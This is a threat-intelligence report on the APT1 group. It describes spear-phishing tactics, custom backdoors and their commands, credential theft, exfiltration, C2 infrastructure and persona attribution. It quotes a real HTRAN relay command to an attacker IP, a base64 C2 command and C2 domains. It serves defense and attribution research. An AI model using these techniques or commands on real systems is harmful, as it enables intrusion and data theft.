In addition , below is a list of public reports about Chinese threat actors that we have confirmed as referring to APT1 .
» » The earliest known public report about APT1 infrastructure is a 2006 publication from the Japanese division of Symantec .
The report calls out the hostname sb.hugesoft.org , which is registered to an APT1 persona known as Ugly Gorilla ( discussed later in this report ) .
» » In September 2012 , Brian Krebs of the `` Krebs on Security '' cybercrime blog reported on a security breach at Telvent Canada Ltd ( now Schneider Electric ) , which we attributed to APT1 based on the tools and infrastructure that the hackers used to exploit and gain access to the system .
» » A SCADA security company by the name of Digital Bond published a report of spear phishing against its company in June 2012 .
AlienVault provided analysis on the associated malware .
Indicators included in the report have been attributed as part of APT1 infrastructure .
» » In November 2012 , Bloomberg 's Chloe Whiteaker authored a piece on a Chinese threat group called `` Comment Group , '' which described the various tools and domains used by APT1 persona Ugly Gorilla .
APT1 has a well - defined attack methodology , honed over years and designed to steal massive quantities of intellectual property .
They begin with aggressive spear phishing , proceed to deploy custom digital weapons , and end by exporting compressed bundles of files to China – before beginning the cycle again .
They employ good English - with acceptable slang - in their socially engineered emails .
They have evolved their digital weapons for more than seven years , resulting in continual upgrades as part of their own software release cycle .
Their ability to adapt to their environment and spread across systems makes them effective in enterprise environments with trust relationships .
These attacks fit into a cyclic pattern of activity that we will describe in this section within the framework of Mandiant 's Attack Lifecycle model .
In each stage we will discuss APT1 's specific techniques to illustrate their tenacity and the scale at which they operate .
( See Appendix B : `` APT and the Attack Lifecycle '' for a high - level overview of the steps most APT groups take in each stage of the Attack Lifecycle .
) The Initial Compromise represents the methods intruders use to first penetrate a target organization 's network .
As with most other APT groups , spear phishing is APT1 's most commonly used technique .
The spear phishing emails contain either a malicious attachment or a hyperlink to a malicious file .
The subject line and the text in the email body are usually relevant to the recipient .
APT1 also creates webmail accounts using real peoples ' names - names that are familiar to the recipient , such as a colleague , a company executive , an IT department employee , or company counsel - and uses these accounts to send the emails .
As a real - world example , this is an email that APT1 sent to Mandiant employees : At first glance , the email appeared to be from Mandiant 's CEO , Kevin Mandia .
However , further scrutiny shows that the email was not sent from a Mandiant email account , but from `` kevin.mandia @ rocketmail.com '' .
Rocketmail is a free webmail service .
The account `` kevin.mandia @ rocketmail.com '' does not belong to Mr. Mandia .
Rather , an APT1 actor likely signed up for the account specifically for this spear phishing event .
If anyone had clicked on the link that day ( which no one did , thankfully ) , their computer would have downloaded a malicious ZIP file named `` Internal _ Discussion_Press_Release_In_Next_Week8.zip '' .
This file contained a malicious executable that installs a custom APT1 backdoor that we call WEBC2-TABLE .
Although the files that APT1 actors attach or link to spear phishing emails are not always in ZIP format , this is the predominant trend we have observed in the last several years .
Below is a sampling of file names that APT1 has used with their malicious ZIP files : The example file names include military , economic , and diplomatic themes , suggesting the wide range of industries that APT1 targets .
Some names are also generic ( e.g. , `` updated_office_contact_v1.zip '' ) and could be used for targets in any industry .
On some occasions , unsuspecting email recipients have replied to the spear phishing messages , believing they were communicating with their acquaintances .
In one case a person replied , `` I ' m not sure if this is legit , so I did n't open it .
'' Within 20 minutes , someone in APT1 responded with a terse email back : `` It 's legit .
'' Establishing a foothold involves actions that ensure control of the target network 's systems from outside the network .
APT1 establishes a foothold once email recipients open a malicious file and a backdoor is subsequently installed .
A backdoor is software that allows an intruder to send commands to the system remotely .
In almost every case , APT backdoors initiate outbound connections to the intruder 's `` command and control '' ( C2 ) server .
APT intruders employ this tactic because while network firewalls are generally adept at keeping malware outside the network from initiating communication with systems inside the network , they are less reliable at keeping malware that is already inside the network from communicating to systems outside .
While APT1 intruders occasionally use publicly available backdoors such as Poison Ivy and Gh0st RAT , the vast majority of the time they use what appear to be their own custom backdoors .
We have documented 42 families of backdoors in `` Appendix C : The Malware Arsenal '' that APT1 uses that we believe are not publicly available .
In addition we have provided 1,007 MD5 hashes associated with APT1 malware in Appendix E. We will describe APT1 's backdoors in two categories : `` Beachhead Backdoors '' and `` Standard Backdoors .
'' Beachhead backdoors are typically minimally featured .
They offer the attacker a toe - hold to perform simple tasks like retrieve files , gather basic system information and trigger the execution of other more significant capabilities such as a standard backdoor .
APT1 's beachhead backdoors are usually what we call WEBC2 backdoors .
WEBC2 backdoors are probably the most well - known kind of APT1 backdoor , and are the reason why some security companies refer to APT1 as the `` Comment Crew .
'' A WEBC2 backdoor is designed to retrieve a webpage from a C2 server .
It expects the webpage to contain special HTML tags ; the backdoor will attempt to interpret the data between the tags as commands .
Older versions of WEBC2 read data between HTML comments , though over time WEBC2 variants have evolved to read data contained within other types of tags .
From direct observation , we can confirm that APT1 was using WEBC2 backdoors as early as July 2006 .
However , the first compile time we have for WEBC2-KT3 is 2004 - 01 - 23 , suggesting that APT1 has been crafting WEBC2 backdoors since early 2004 .
Based on the 400 + samples of WEBC2 variants that we have accumulated , it appears that APT1 has direct access to developers who have continually released new WEBC2 variants for over six years .
For example , these two build paths , which were discovered inside WEBC2-TABLE samples , help to illustrate how APT1 has been steadily building new WEBC2 variants as part of a continuous development process : A `` build path '' discloses the directory from which the programmer built and compiled his source code .
These samples , compiled 2.5 years apart , were compiled within a folder named `` work\code\ ...
\ mywork '' .
The instances of `` work '' suggest that working on WEBC2 is someone 's day job and not a side project or hobby .
Furthermore , the Sample A build string includes `` 2012 - 2 - 23 '' - which matches Sample A 's compile date .
The Sample B build string lacks `` 2012 - 2 - 23 '' but includes `` 2009 - 8 - 7 '' - which also matches Sample B 's compile date .
This suggests that the code used to compile Sample A was modified from code that was used to compile Sample B 2.5 years previously .
The existence of `` 2008 - 7 - 8 '' suggests that the code for both samples was modified from a version that existed in July 2008 , a year before Sample B was created .
This series of dates indicates that developing and modifying the WEBC2 backdoor is an iterative and long - term process .
WEBC2 backdoors typically give APT1 attackers a short and rudimentary set of commands to issue to victim systems , including : » » Open an interactive command shell ( usually Windows ' cmd.exe ) » » Download and execute a file » » Sleep ( i.e .
remain inactive ) for a specified amount of time WEBC2 backdoors are often packaged with spear phishing emails .
Once installed , APT1 intruders have the option to tell victim systems to download and execute additional malicious software of their choice .
WEBC2 backdoors work for their intended purpose , but they generally have fewer features than the `` Standard Backdoors '' described below .
The standard , non - WEBC2 APT1 backdoor typically communicates using the HTTP protocol ( to blend in with legitimate web traffic ) or a custom protocol that the malware authors designed themselves .
These backdoors give APT intruders a laundry list of ways to control victim systems , including : » » Create / modify / delete / execute programs » » Upload / download files » » Create / delete directories » » List / start / stop processes » » Modify the system registry » » Take screenshots of the user 's desktop » » Capture keystrokes » » Capture mouse movement » » Start an interactive command shell » » Create a Remote desktop ( i.e .
graphical ) interface » » Harvest passwords » » Enumerate users » » Enumerate other systems on the network » » Sleep ( i.e .
go inactive ) for a specified amount of time » » Log off the current user » » Shut down the system The BISCUIT backdoor ( so named for the command `` bdkzt '' ) is an illustrative example of the range of commands that APT1 has built into its `` standard '' backdoors .
APT1 has used and steadily modified BISCUIT since as early as 2007 and continues to use it presently .
These functions are characteristic of most backdoors , and are not limited to APT1 or even APT .
For example , anyone who wants to control a system remotely will likely put functions like `` Upload / download files '' into a backdoor .
Some APT backdoors attempt to mimic legitimate Internet traffic other than the HTTP protocol .
APT1 has created a handful of these , including : When network defenders see the communications between these backdoors and their C2 servers , they might easily dismiss them as legitimate network traffic .
Additionally , many of APT1 's backdoors use SSL encryption so that communications are hidden in an encrypted SSL tunnel .
We have provided APT1 's public SSL certificates in Appendix F so people can incorporate them into their network signatures .
Escalating privileges involves acquiring items ( most often usernames and passwords ) that will allow access to more resources within the network .
In this and the next two stages , APT1 does not differ significantly from other APT intruders ( or intruders , generally ) .
APT1 predominantly uses publicly available tools to dump password hashes from victim systems in order to obtain legitimate user credentials .
APT1 has used these privilege escalation tools : In the Internal Reconnaissance stage , the intruder collects information about the victim environment .
Like most APT ( and non - APT ) intruders , APT1 primarily uses built - in operating system commands to explore a compromised system and its networked environment .
Although they usually simply type these commands into a command shell , sometimes intruders may use batch scripts to speed up the process .
Figure 18 below shows the contents of a batch script that APT1 used on at least four victim networks .
This script performs the following functions and saves the results to a text file : » » Display the victim 's network configuration information » » List the services that have started on the victim system » » List currently running processes » » List accounts on the system » » List accounts with administrator privileges » » List current network connections » » List currently connected network shares » » List other systems on the network » » List network computers and accounts according to group ( `` domain controllers , '' `` domain users , '' `` domain admins , '' etc .
) Once an APT intruder has a foothold inside the network and a set of legitimate credentials , it is simple for the intruder to move around the network undetected : » » They can connect to shared resources on other systems » » They can execute commands on other systems using the publicly available `` psexec '' tool from Microsoft Sysinternals or the built - in Windows Task Scheduler ( `` at.exe '' ) These actions are hard to detect because legitimate system administrators also use these techniques to perform actions around the network .
In this stage , the intruder takes actions to ensure continued , long - term control over key systems in the network environment from outside of the network .
APT1 does this in three ways .
1 .
Install new backdoors on multiple systems Throughout their stay in the network ( which could be years ) , APT1 usually installs new backdoors as they claim more systems in the environment .
Then , if one backdoor is discovered and deleted , they still have other backdoors they can use .
We usually detect multiple families of APT1 backdoors scattered around a victim network when APT1 has been present for more than a few weeks .
2 .
Use legitimate VPN credentials APT actors and hackers in general are always looking for valid credentials in order to impersonate a legitimate user .
We have observed APT1 using stolen usernames and passwords to log into victim networks ' VPNs when the VPNs are only protected by single - factor authentication .
From there they are able to access whatever the impersonated users are allowed to access within the network .
3 .
Log in to web portals Once armed with stolen credentials , APT1 intruders also attempt to log into web portals that the network offers .
This includes not only restricted websites , but also web - based email systems such as Outlook Web Access .
Similar to other APT groups we track , once APT1 finds files of interest they pack them into archive files before stealing them .
APT intruders most commonly use the RAR archiving utility for this task and ensure that the archives are password protected .
Sometimes APT1 intruders use batch scripts to assist them in the process , as depicted in Figure 19 .
( The instances of `` XXXXXXXX '' obfuscate the text that was in the actual batch script .
) After creating files compressed via RAR , the APT1 attackers will transfer files out of the network in ways that are consistent with other APT groups , including using the File Transfer Protocol ( FTP ) or their existing backdoors .
Many times their RAR files are so large that the attacker splits them into chunks before transferring them .
Figure 19 above shows a RAR command with the option `` -v200 m '' , which means that the RAR file should be split up into 200 MB portions .
Unlike most other APT groups we track , APT1 uses two email - stealing utilities that we believe are unique to APT1 .
The first , GETMAIL , was designed specifically to extract email messages , attachments , and folders from within Microsoft Outlook archive ( `` PST '' ) files .
Microsoft Outlook archives can be large , often storing years ' worth of emails .
They may be too large to transfer out of a network quickly , and the intruder may not be concerned about stealing every email .
The GETMAIL utility allows APT1 intruders the flexibility to take only the emails between dates of their choice .
In one case , we observed an APT1 intruder return to a compromised system once a week for four weeks in a row to steal only the past week 's emails .
Whereas GETMAIL steals email in Outlook archive files , the second utility , MAPIGET , was designed specifically to steal email that has not yet been archived and still resides on a Microsoft Exchange Server .
In order to operate successfully , MAPIGET requires username / password combinations that the Exchange server will accept .
MAPIGET extracts email from specified accounts into text files ( for the email body ) and separate attachments , if there are any .
APT1 's `` It 's legit '' email should not mislead someone into thinking that APT1 personnel are all fluent in English , though some undoubtedly are .
Their own digital weapons betray the fact that they were programmed by people whose first language is not English .
Here are some examples of grammatically incorrect phrases that have made it into APT1 's tools over the years .
APT1 maintains an extensive infrastructure of computers around the world .
We have evidence suggesting that APT1 manually controls thousands of systems in support of their attacks , and have directly observed their control over hundreds of these systems .
Although they control systems in dozens of countries , their attacks originate from four large networks in Shanghai - two of which are allocated directly to the Pudong New Area , the home of Unit 61398 .
The sheer number of APT1 IP addresses concentrated in these Shanghai ranges , coupled with Simplified Chinese keyboard layout settings on APT1 's attack systems , betrays the true location and language of the operators .
To help manage the vast number of systems they control , APT1 has registered hundreds of domain names , the majority of which also point to a Shanghai locale .
The domain names and IP addresses together comprise APT1 's command and control framework which they manage in concert to camouflage their true origin from their English speaking targets .
We are frequently asked why it is an ineffective security measure to just block all IP addresses in China from connecting to your network .
To put it simply , it is easy for APT1 attackers to bounce or `` hop '' through intermediary systems such that they almost never connect to a victim network directly from their systems in Shanghai .
Using their immense infrastructure , they are able to make it appear to victims that an attack originates from almost any country they choose .
The systems in this type of network redirection infrastructure have come to be called `` hop points '' or `` hops .
'' Hop points are most frequently compromised systems that APT1 uses , in some instances for years , as camouflage for their attacks without the knowledge of the systems ' owners .
These systems belong to third - party victims who are compromised for access to infrastructure , as opposed to direct victims who are compromised for their data and intellectual property .
We have observed some of APT1 's activities after they cross into ( virtual ) U.S. territory .
They access hop points using a variety of techniques , the most popular being Remote Desktop and FTP .
Over a two - year period ( January 2011 to January 2013 ) we confirmed 1,905 instances of APT1 actors logging into their hop infrastructure from 832 different IP addresses with Remote Desktop .
Remote Desktop provides a remote user with an interactive graphical interface to a system .
The experience is similar to the user actually physically sitting at the system and having direct access to the desktop , keyboard , and mouse .
Of the 832 IP addresses , 817 ( 98.2 % ) were Chinese and belong predominantly to four large net blocks in Shanghai which we will refer to as APT1 's home networks .
Notably , the registration information for the second and third net blocks above includes this contact information at the end : person : yanling ruan nic - hdl : YR194-AP e - mail : sh - ipmaster @ chinaunicom.cn address : No.900 , Pudong Avenue , ShangHai , China phone : + 086 - 021 - 61201616 fax - no : + 086 - 021 - 61201616 country : cn The registration information for these two net blocks suggests that they serve the Pudong New Area of Shanghai , where PLA Unit 61398 is headquartered .
The other 15 of the 832 IP addresses are registered to organizations in the U.S. ( 12 ) , Taiwan ( 1 ) , Japan ( 1 ) and Korea ( 1 ) .
We have confirmed that some of these systems are part of APT1 's hop infrastructure and not legitimately owned by APT1 - in other words , APT1 accessed one hop from another hop , as opposed to accessing the hop directly from Shanghai .
In order to make a user 's experience as seamless as possible , the Remote Desktop protocol requires client applications to forward several important details to the server , including their client hostname and the client keyboard layout .
In 1,849 of the 1,905 ( 97 % ) APT1 Remote Desktop sessions we observed in the past two years , the keyboard layout setting was `` Chinese ( Simplified ) - US Keyboard .
'' Microsoft 's Remote Desktop client configures this setting automatically based on the selected language on the client system , making it nearly certain that the APT1 actors managing the hop infrastructure are doing so with Simplified Chinese ( zh - cn ) input settings .
`` Simplified Chinese '' is a streamlined set of the traditional Chinese characters that have been in use since the 1950s , originating in mainland China .
Taiwan and municipalities such as Hong Kong still use `` Traditional Chinese '' ( zh - tw ) character sets .
The overwhelming concentration of Shanghai IP addresses and Simplified Chinese language settings clearly indicate that APT1 intruders are mainland Chinese speakers with ready access to large networks in Shanghai .
The only alternative is that APT1 has intentionally been conducting a years - long deception campaign to impersonate Chinese speakers from Shanghai in places where victims are not reasonably expected to have any visibility – and without making a single mistake that might indicate their `` true '' identity .
As we just mentioned , APT1 attackers typically use hops to connect to and control victim systems .
Victim backdoors regularly connect out to hop points , waiting for the moment that the attacker is there to give them commands .
However , exactly how this works is often specific to the tools they are using .
As covered in the previous `` Attack Lifecycle '' section , WEBC2 backdoor variants download and interpret data stored between tags in HTML pages as commands .
They usually download HTML pages from a system within APT1 's hop infrastructure .
We have observed APT1 intruders logging in to WEBC2 servers and manually editing the HTML pages that backdoors will download .
Because the commands are usually encoded and difficult to spell from memory , APT1 intruders typically do not type these strings , but instead copy and paste them into the HTML files .
They likely generate the encoded commands on their own systems before pasting them in to an HTML file hosted by the hop point .
For example , we observed an APT attacker pasting the string `` czo1NA== '' into an HTML page .
That string is the base64- encoded version of `` s:54 '' , meaning `` sleep for 54 minutes '' ( or hours , depending on the particular backdoor ) .
In lieu of manually editing an HTML file on a hop point , we have also observed APT1 intruders uploading new ( already - edited ) HTML files .
When APT1 attackers are not using WEBC2 , they require a `` command and control '' ( C2 ) user interface so they can issue commands to the backdoor .
This interface sometimes runs on their personal attack system , which is typically in Shanghai .
In these instances , when a victim backdoor makes contact with a hop , the communications need to be forwarded from the hop to the intruder 's Shanghai system so the backdoor can talk to the C2 server software .
We have observed 767 separate instances in which APT1 intruders used the publicly available `` HUC Packet Transmit Tool '' or HTRAN on a hop .
As always , keep in mind that these uses are confirmed uses , and likely represent only a small fraction of APT1 's total activity .
The HTRAN utility is merely a middle - man , facilitating connections between the victim and the attacker who is using the hop point .
Typical use of HTRAN is fairly simple : the attacker must specify the originating IP address ( of his or her workstation in Shanghai ) , and a port on which to accept connections .
For example , the following command , which was issued by an APT1 actor , will listen for incoming connections on port 443 on the hop and automatically proxy them to the Shanghai IP address 58.247.242.254 on port 443 : htran -tran 443 58.247.242.254 443 In the 767 observed uses of HTRAN , APT1 intruders supplied 614 distinct routable IP addresses .
In other words , they used their hops to function as middlemen between victim systems and 614 different addresses .
Of these addresses , 613 of 614 are part of APT1 's home networks : Occasionally , APT1 attackers have installed C2 server components on systems in their hop infrastructure rather than forwarding connections back to C2 servers in Shanghai .
In these instances they do not need to use a proxy tool like HTRAN to interact with victim systems .
However , it does mean that the intruders need to be able to interface with the ( often graphical ) C2 server software running on the hop .
We have observed APT1 intruders log in to their hop point , start the C2 server , wait for incoming connections , and then proceed to give commands to victim systems .
WEBC2 variants may include a server component that provides a simple C2 interface to the intruder .
This saves the intruder from having to manually edit webpages .
That is , this server component receives connections from victim backdoors , displays them to the intruder , and then translates the intruder 's commands into HTML tags that the victim backdoors read .
In the last two years alone , we have confirmed 937 APT1 C2 servers - that is , actively listening or communicating programs - running on 849 distinct IP addresses .
However , we have evidence to suggest that APT1 is running hundreds , and likely thousands , of other servers ( see the Domains section below ) .
The programs acting as APT1 servers have mainly been : ( 1 ) FTP , for transferring files ; ( 2 ) web , primarily for WEBC2 ; ( 3 ) RDP , for remote graphical control of a system ; ( 4 ) HTRAN , for proxying ; and ( 5 ) C2 servers associated with various backdoor families ( covered in Appendix C : The Malware Arsenal ) .
The Domain Name System ( DNS ) is the phone book of the Internet .
In the same way that people program named contacts into their cell phones and no longer need to remember phone numbers , DNS allows people to remember names like `` google.com '' instead of IP addresses .
When a person types `` google.com '' into a web browser , a DNS translation to an IP address occurs so that the person 's computer can communicate with Google .
Names that can be translated through DNS to IP addresses are referred to as Fully Qualified Domain Names ( FQDNs ) .
APT1 's infrastructure includes FQDNs in addition to the IP addresses discussed above .
The FQDNs play an important role in their intrusion campaigns because APT1 embeds FQDNs as C2 addresses within their backdoors .
In the last several years we have confirmed 2,551 FQDNs attributed to APT1 .
Of these , we have redacted FQDNs that implicated victims by name and provided 2,046 in Appendix D. By using FQDNs rather than hard - coded IP addresses as C2 addresses , attackers may dynamically decide where to direct C2 connections from a given backdoor .
That is , if they lose control of a specific hop point ( IP address ) they can `` point '' the C2 FQDN address to a different IP address and resume their control over victim backdoors .
This flexibility allows the attacker to direct victim systems to myriad C2 servers and avoid being blocked .
APT1 FQDNs can be grouped into three categories : ( 1 ) registered zones , ( 2 ) third - party zones , and ( 3 ) hijacked domains .
Registered Zones A DNS zone represents a collection of FQDNs that end with the same name , and which are usually registered through a domain registration company and controlled by a single owner .
For example , `` hugesoft.org '' is an FQDN but also represents a zone .
The FQDNs `` ug-co.hugesoft.org '' and `` 7cback.hugesoft.org '' are part of the `` hugesoft.org '' zone and are called `` subdomains '' of the zone .
The person who registered `` hugesoft.org '' may add as many subdomains as they wish and controls the IP resolutions of these FQDNs .
APT1 has registered at least 107 zones since 2004 .
Within these zones , we know of thousands of FQDNs that have resolved to hundreds of IP addresses ( which we suspect are hops ) and in some instances to APT1 's source IP addresses in Shanghai .
The first zone we became aware of was `` hugesoft.org '' , which was registered through eNom , Inc. in October 2004 .
The registrant supplied `` uglygorilla @ 163.com '' as an email address .
The supplied registration information , which is still visible in public `` whois '' data as of February 3 , 2013 , includes the following : Domain Name : HUGESOFT.ORG Created On:25-Oct-2004 09:46:18 UTC Registrant Name : huge soft Registrant Organization : hugesoft Registrant Street1 : shanghai Registrant City : shanghai Registrant State / Province : S Registrant Postal Code:200001 Registrant Country : CN Registrant Phone : + 86.21000021 Registrant Email : uglygorilla @ 163.com The supplied registrant information does not need to be accurate for the zone to be registered successfully .
For example , `` shanghai '' is not a street name .
Nevertheless , it is noteworthy that Shanghai appeared in the first known APT1 domain registration , along with a phone number that begins with China 's `` + 86 '' international code .
In fact , Shanghai was listed as the registrant 's city in at least 24 of the 107 ( 22 % ) registrations .
Compare this to the frequency with which other cities appeared in APT1 zone registration information : Some of the supplied registration information is obviously false .
For example , consider the registration information supplied for the zone `` uszzcs.com '' in 2005 : Victor etejedaa @ yahoo.com + 86.8005439436 Michael Murphy 795 Livermore St. Yellow Spring , Ohio , UNITED STATES 45387 Here , a phone number with a Chinese prefix ( `` + 86 '' ) accompanied an address in the United States .
Since the United States uses the prefix `` + 1 '' , it is highly unlikely that a person living in Ohio would provide a phone number beginning with `` + 86 '' .
Additionally , the city name is spelled incorrectly , as it should be `` Yellow Springs '' instead of `` Yellow Spring '' .
This could have been attributed to a one - time spelling mistake , except the registrant spelled the city name incorrectly multiple times , both for the zones `` uszzcs.com '' and `` attnpower.com '' .
This suggests that the registrant really thought `` Yellow Spring '' was the correct spelling and that he or she did not , in fact , live or work in Yellow Springs , Ohio .
Overall , the combination of a relatively high number of `` Shanghai '' registrations with obviously false registration examples in other registrations suggests a partially uncoordinated domain registration campaign from 2004 until present , in which some registrants tried to fabricate non - Shanghai locations but others did not .
This is supported by contextual information on the Internet for the email address `` lfengg @ 163.com , '' which was supplied in the registration information for seven of the 107 zones .
On the site `` www.china-one.org , '' the email address `` lfengg @ 163.com '' appears as the contact for the Shanghai Kai Optical Information Technology Co. , Ltd. , a website production company located in a part of Shanghai that is across the river from PLA Unit 61398 .
About half of APT1 's known zones were named according to three themes : news , technology and business .
These themes cause APT1 command and control addresses to appear benign at first glance .
However , we believe that the hundreds of FQDNs within these zones were created for the purpose of APT1 intrusions .
( Note : these themes are not unique to APT1 or even APT in general .
) The news - themed zones include the names of well - known news media outlets such as CNN , Yahoo and Reuters .
However , they also include names referencing English - speaking countries , such as `` aunewsonline.com '' ( Australia ) , '' canadatvsite.com '' ( Canada ) , and `` todayusa.org '' ( U.S. ) .
Below is a list of zones registered by APT1 that are news- themed : The technology - themed zones reference well - known technology companies ( AOL , Apple , Google , Microsoft ) , antivirus vendors ( McAfee , Symantec ) , and products ( Blackberry , Bluecoat ) .
APT1 also used more generic names referencing topics like software : Finally , some zones used by APT1 reflect a business theme .
The names suggest websites that professionals might visit : Not every zone stays within APT1 's control forever .
Over a campaign lasting for so many years , APT1 has not always renewed every zone in their attack infrastructure .
Additionally , while some have simply been allowed to expire , others have been transferred to the organizations that the domain names attempted to imitate .
For example , in September 2011 , Yahoo filed a complaint against `` zheng youjun '' of `` Arizona , USA '' , who registered the APT1 zone `` myyahoonews.com '' .
Yahoo alleged the `` < myyahoonews.com > domain name was confusingly similar to Complainant 's YAHOO ! mark '' and that `` [ zheng youjun ] registered and used the < myyahoonews.com > domain name in bad faith .
'' In response , the National Arbitration Forum found that the site `` myyahoonews.com '' at the time resolved to `` a phishing web page , substantially similar to the actual WorldSID website ...
in an effort to collect login credentials under false pretenses .
'' Not surprisingly , `` zheng youjun '' did not respond .
Subsequently , control of `` myyahoonews .
com '' was transferred from APT1 to Yahoo .
The third - party service that APT1 has used the most is known as `` dynamic DNS .
'' This is a service that allows people to register subdomains under zones that other people have registered and provided to the service .
Over the years , APT1 has registered hundreds of FQDNs in this manner .
When they need to change the IP resolution of an FQDN , they simply log in to these services and update the IP resolution of their FQDN via a web - based interface .
In addition to dynamic DNS , recently we have observed that APT1 has been creating FQDNs that end with '' appspot.com '' , suggesting that they are using Google 's App Engine service .
APT1 intruders often use the FQDNs that are associated with legitimate websites hosted by their hop points .
We consider these domains to be `` hijacked '' because they were registered by someone for a legitimate reason , but have been leveraged by APT1 for malicious purposes .
APT1 uses hijacked FQDNs for two main purposes .
First , they place malware ( usually in ZIP files ) on the legitimate websites hosted on the hop point and then send spear phishing emails with a link that includes the legitimate FQDN .
Second , they embed hijacked FQDNs as C2 addresses in their backdoors .
Evidence of a Vast Infrastructure As noted above , we have confirmed the existence of 937 servers ( listening applications ) hosted on 849 distinct IP addresses , with the majority of IP addresses registered to organizations in China ( 709 ) , followed by the U.S. ( 109 ) .
In the last three years we have observed APT1 FQDNs resolving to 988 unique IP addresses that we believe are not '' sinkhole '' or `` domain parking '' IP addresses : » » United States : 559 » » China : 263 » » Taiwan : 25 » » Korea : 22 » » United Kingdom : 14 » » Canada : 12 » » Other : 83 The vast majority of the Chinese IP addresses again belong to APT1 's home networks , meaning that in some instances APT1 intruders probably communicated directly to victim systems from their Shanghai systems , bypassing their hop infrastructure : These statistics indicate that there are over 400 IP addresses in the U.S. alone that may have active APT1 servers , which are as - yet unconfirmed by Mandiant .
Additionally , although we know of over 2,500 APT1 FQDNs , there are many APT1 FQDNs that we have not attributed to APT1 , which have resolved to even more IP addresses .
We estimate ( conservatively ) that APT1 's current hop infrastructure includes over 1,000 servers .
APT1 is not a ghost in a digital machine .
In our effort to underscore that there are actual individuals tasked by the PLA behind APT1 's keyboards , we have decided to expose the identities of a select number of APT1 personas .
These actors have made poor operational security choices , facilitating our research and allowing us to track their activities .
They are some of the authors of APT1 's digital weapons and the registrants of APT1 FQDNs and email accounts .
These actors have expressed interest in China 's cyber warfare efforts , disclosed their locations to be the Pudong New Area of Shanghai , and have even used a Shanghai mobile phone number to register email accounts used in spear phishing campaigns .
Methods for attributing APT personnel often involve the synthesis of many small pieces of information into a singular comprehensive picture .
Often this unified viewpoint reveals not only the group attribution , but coherent pockets of behavior within the group which we perceive to be either small teams or individual actors .
We refer to these as '' personas .
'' As APT1 personas manage technical resources such as hops and Fully Qualified Domain Names ( FQDNs ) , they have been observed to de - conflict their actions amongst themselves by coordinating the use of specific hops , FQDNs , CNO tools ( e.g. , malware ) and ports .
One additional element working in our favor as threat trackers is the Great Firewall of China ( GFWoC ) .
Like many Chinese hackers , APT1 attackers do not like to be constrained by the strict rules put in place by the Communist Party of China ( CPC ) , which deployed the GFWoC as a censorship measure to restrict access to web sites such as google .
com , facebook.com , and twitter.com .
Additionally , the nature of the hackers ' work requires them to have control of network infrastructure outside the GFWoC .
This creates a situation where the easiest way for them to log into Facebook and Twitter is directly from their attack infrastructure .
Once noticed , this is an effective way to discover their real identities .
What is the Great Firewall of China ? The `` Great Firewall '' is a term used to describe the various technical methods used by the Chinese government to censor and block or restrict access to Internet services and content that the government considers sensitive or inappropriate .
`` Inappropriate '' content ranges from pornography to political dissent , and from social media to news sites that may portray China or Chinese officials in a negative light .
The `` Great Firewall '' uses methods such as blocking particular IP addresses ; blocking or redirecting specific domain names ; filtering or blocking any URL containing target keywords ; and rate - limiting or resetting TCP connections .
Chinese censors also routinely monitor Chinese websites , blogs , and social media for `` inappropriate '' content , removing it when found .
As a result , Chinese citizens who wish to access censored content must resort to workarounds such as the use of encryption .
China continues to improve and further restrict Internet access , most recently ( in December 2012 ) by blocking additional services and limiting or blocking the use of encryption technologies such as Virtual Private Networks .
The story of `` Ugly Gorilla '' ( UG ) dates back to 2004 .
A then - professor named Zhang Zhaozhong ( 张召 忠 ) , now a retired rear admiral , was in the process of helping to shape the future of China 's information warfare strategy .
Professor Zhang was already a strong advocate for the `` informationization '' of military units , and had published several works on military strategy including `` Network Warfare '' ( 网络战争 ) and '' Winning the Information War '' ( 打赢信息化战争 ) .
As Director of the `` Military Technology and Equipment '' ( 军事科技与装备 ) department at China 's National Defense University ( 国防大学 ) , professor Zhang was invited to take part in an event titled `` Outlook 2004 : The International Strategic Situation '' in January 2004 .
During the online question and answer session hosted by the PLA Daily 's ( 解放军报 ) China Military Online ( 中国军网 ) , one young man with the nickname '' Greenfield '' ( 绿野 ) posed a particularly prescient question .
`` Professor Zhang , I read your book ' Network Warfare ' and was deeply impressed by the views and arguments in the book .
It is said that the U.S. military has set up a dedicated network force referred to as a ' cyber army .
' Does China have a similar force ? Does China have cyber troops ? '' - UglyGorilla 16 Jan 2004 Like all users of the China Military Online ( chinamil ) forums , `` Greenfield '' was required to sign up with an email address and specify a small bit of information about himself .
Thankfully , the Internet 's tendency to immortalize data preserved the profile details for us .
Thus , the persona we call `` UglyGorilla '' ( UG ) was first documented .
In addition to his email address , UG listed his `` real name '' as `` JackWang '' .
Within the year , we saw the first evidence of UG honing the tools of his trade .
On October 25 , 2004 , UG registered the now infamous `` hugesoft.org '' zone .
The `` hugesoft.org '' zone and its many APT1-attributed hostnames have remained active and under the continuous ownership of UG , and are still active as of the time of this report .
Registration information was most recently updated on September 10 , 2012 , extending the registration period for the zone well into 2013 .
We may see UG relinquish this and other attributed zones as a result of this reporting , in an effort to deter further tracking and attribution .
In 2007 , UG authored the first known sample of the MANITSME family of malware and , like a good artist , left his clearly identifiable signature in the code : `` v1.0 No Doubt to Hack You , Writed by UglyGorilla , 06/29/2007 '' [ sic ] .
UG 's tendency to sign his work is present in the strings he chooses for hostnames and even within the communications protocols his backdoors use .
For example , hostnames within other APT1-attributed FQDNs such as `` arrowservice.net '' and even the newer `` msnhome.org '' continue to leave UG 's imprint ( note the `` ug '' in the domains ) : » » ug-opm.hugesoft.org » » ug-rj.arrowservice.net » » ug-hst.msnhome.org Though these kinds of obvious attribution links tapered off as UG became more experienced , the protocol signatures of his tools such as MANITSME and WEBC2-UGX continue to be used by APT1 attackers based out of Shanghai .
UG 's consistent use of the username `` UglyGorilla '' across various Web accounts has left a thin but strong thread of attribution through many online communities .
In most instances , content such as hacking tools , information security topics , and association with the Shanghai locality are reasonable ways to eliminate false positives .
For example , in February of 2011 , the disclosure of all registered `` rootkit.com '' accounts published by Anonymous included the user '' uglygorilla '' with the registered email address uglygorilla @ 163.com .
This is the same email used to register for the 2004 PLA forum and the zone hugesoft.org .
Included in the rootkit.com leaked account information was the IP address 58.246.255.28 , which was used to register UG 's account directly from the previously discussed APT1 home range : 58.246.0.0/15 .
In a few of these accounts , UG has listed something other than `` JackWang '' as his real name .
On February 2 , 2006 , a user named `` uglygorilla '' uploaded a file named `` mailbomb_1.08.zip '' ( a bulk email tool ) to the Chinese developer site PUDN ( www.pudn.com ) .
His account details from PUDN included the real name `` Wang Dong '' ( 汪东 ) .
It is important to note two things at this point .
First , Chinese names begin with the surname .
So `` Wang '' is the last name in 汪东 .
